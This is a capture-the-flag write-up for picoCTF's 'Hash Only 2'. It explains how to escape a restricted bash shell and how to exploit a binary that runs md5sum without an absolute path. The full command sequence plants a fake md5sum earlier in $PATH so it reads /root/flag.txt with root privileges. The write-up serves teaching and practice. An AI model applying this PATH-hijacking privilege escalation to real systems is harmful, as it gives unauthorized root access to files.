# Hash Only 2
## Pico CTF -- Medium


Rather than supplying a binary, this challenge gives us an shh server to connect to, and a command to run on the server.

Running the command 'flaghasher' prints the md5 hash of the flag /root/flag.txt.

The shell environment we land in is highly restriced, we cannot change directories, or reference files in other directories.

To bypass rbash (restricted bash), we can simply spawn a new shell in the terminal by typing **bash**.

    ctf-player@pico-chall$ ls
    ctf-player@pico-chall$ cd /usr/local/bin
    -rbash: cd: restricted
    ctf-player@pico-chall$ cd /
    -rbash: cd: restricted
    ctf-player@pico-chall$ bash

We can now attempt to reverse engineer the flaghasher binary, located at /usr/local/bin/flaghasher.

    ctf-player@challenge:/usr/local/bin$ strings /usr/local/bin/flaghasher
    /lib64/ld-linux-x86-64.so.2
    .
    .
    .
    Computing the MD5 hash of /root/flag.txt.... 
    /bin/bash -c 'md5sum /root/flag.txt'
    Error: system() call returned non-zero value: 
    .
    .
    .

Notice, the binary simply makes a system call to run **md5sum** on the flag. Notice also, the binary does not use the absolute path to **md5sum**.

    ctf-player@challenge:/usr/local/bin$ find / -type f -name md5sum 2>/dev/null
    /usr/bin/md5sum

There are other directories, higher up in the $PATH variable. If we can write an executable file named md5sum to one of the directories before /usr/bin/, the flaghasher program will find our malicious md5sum binary first, and execute it with root permissions.


ctf-player@challenge:/usr/local/bin$ export $PATH
bash: export: `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': not a valid identifier
ctf-player@challenge:/usr/local/bin$ echo "cat /root/flag.txt" >> /usr/local/sbin/md5sum
bash: /usr/local/sbin/md5sum: Permission denied
ctf-player@challenge:/usr/local/bin$ echo "cat /root/flag.txt" >> /usr/local/bin/md5sum
ctf-player@challenge:/usr/local/bin$ chmod +x /usr/local/bin/md5sum
ctf-player@challenge:/usr/local/bin$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}